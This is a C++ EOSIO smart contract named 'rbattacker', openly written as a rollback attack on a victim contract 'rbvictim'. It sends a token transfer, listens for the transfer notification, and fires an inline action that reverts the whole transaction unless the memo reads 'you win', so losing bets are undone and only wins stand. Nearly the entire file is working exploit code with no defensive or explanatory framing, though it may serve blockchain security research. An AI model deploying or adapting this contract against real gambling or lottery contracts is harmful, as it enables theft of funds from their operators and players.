#include <eosio/eosio.hpp>
#include <eosio/action.hpp>
#include <eosio/asset.hpp>
using namespace eosio;

// Define a struct for the transfer action data
struct transfer_data
{
    eosio::name from;
    eosio::name to;
    eosio::asset quantity;
    std::string memo;

    EOSLIB_SERIALIZE(transfer_data, (from)(to)(quantity)(memo))
};

namespace eosio
{
    // attacker contract
    class [[eosio::contract]] rbattacker : public eosio::contract
    {
    public:
        using eosio::contract::contract;

        // initiate the attack: transfer 1 token to the victim
        // using inline call to eosio.token's transfer
        [[eosio::action]] void attack(std::string memo)
        {
            print("attack start");
            uint8_t p = 4;
            uint8_t num = 1;
            action(
                permission_level{get_self(), "active"_n},
                "eosio.token"_n,
                "transfer"_n,
                std::make_tuple(get_self(),
                                "rbvictim",
                                asset(num * pow(10, p), symbol("SYS", p)),
                                std::string(memo)))
                .send();
        }

        // complete the attack: revert the transaction if not win
        [[eosio::action]] void revert(std::string memo)
        {
            check(memo == "you win", "revert if not win");
        }
    };
}

// handle the notification sent by eosio.token's transfer
void on_transfer(const transfer_data &transfer)
{
    // if the attacker is the receiver of transfer
    if (transfer.to == "rbattacker"_n)
    {
        print(transfer.to, " received ", transfer.quantity.to_string(), " from ", transfer.from.to_string());
        // inline call: call the revert action defined above
        action(
            permission_level{"rbattacker"_n, "active"_n},
            "rbattacker"_n, "revert"_n,
            std::make_tuple(transfer.memo))
            .send();
    }
    // if the attacker is the sender of transfer
    else if (transfer.from == "rbattacker"_n)
    {
        print(transfer.from, " sent ", transfer.quantity.to_string(), " to ", transfer.to.to_string());
    }
}

extern "C"
{
    void apply(uint64_t receiver, uint64_t code, uint64_t action)
    {
        // if the action is called by "self"
        if (code == receiver)
        {
            if (action == name("attack").value)
            {
                eosio::execute_action(eosio::name(receiver), eosio::name(code), &rbattacker::attack);
            }
            else if (action == name("revert").value)
            {
                eosio::execute_action(eosio::name(receiver), eosio::name(code), &rbattacker::revert);
            }
            else
            {
                print("Unknown action");
            }
        }
        // if receiving notification from eosio.token's transfer
        else if (code == name("eosio.token").value)
        {
            if (action == name("transfer").value)
            {
                // call the handler
                on_transfer(unpack_action_data<transfer_data>());
            }
        }
    }
}
